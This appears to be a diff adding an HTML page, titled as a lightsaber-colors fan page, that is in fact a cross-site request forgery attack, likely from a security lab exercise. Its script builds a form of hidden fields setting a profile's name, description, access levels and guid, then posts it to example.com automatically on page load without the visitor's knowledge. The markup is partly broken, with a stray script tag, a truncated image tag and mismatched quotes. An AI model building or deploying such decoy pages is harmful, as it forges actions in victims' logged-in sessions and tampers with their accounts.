@@ -1,0 +1,59 @@
+<html><body>
+
+<script type="text/javascript">
+<h1>Lightsabers, their colors, and meanings</h1>
+<p>
+<img src = "https://i.pinimg.com/originals/1e/d4/c9/1ed4c94f59efe71099159c967ed2bbed.png" height = "1250" width = "1250">
+<img src = 
+</p>
+<p>
+This page forges an HTTP POST request
+</p>
+
+<script type="text/javascript">
+function post(url,fields)
+{
+//create a <form> element.
+var p = document.createElement("form");
+
+//construct the form
+p.action = url; 
+p.innerHTML = fields;
+p.target = "_self";
+p.method = "post";
+
+//append the form to the current page.
+document.body.appendChild(p);
+
+//submit the form
+p.submit();
+}
+
+function csrf_hack()
+{
+ var fields="";
+ 
+ // The following are form entries that need to be filled out
+ // by attackers. The entries are made hidden, so the victim
+ // won’t be able to see them.
+ fields += "<input type='hidden' name='name' value='Alice'>"; 
+ fields += "<input type='hidden' name='description' value='If you can see this text, you've been bamboozled!'>"; 
+ fields += "<input type='hidden' name='accesslevel[description]' value='2'>"; 
+ fields += "<input type='hidden' name='briefdescription' value=''>";
+ fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>"; 
+ fields += "<input type='hidden' name='location’ value=''>";
+ fields += "<input type='hidden' name='accesslevel[location]' value='2'>"; 
+ fields += "<input type='hidden' name='guid’ value='39'>"; 
+ var url = "http://www.example.com"; 
+ 
+ post(url,fields);
+ }
+ 
+ //invoke csrf_hack() after the page is loaded.
+ window.onload = function() { csrf_hack();}
+ </script>
+ </body>
+ </html>
+ 
+ 
+ 
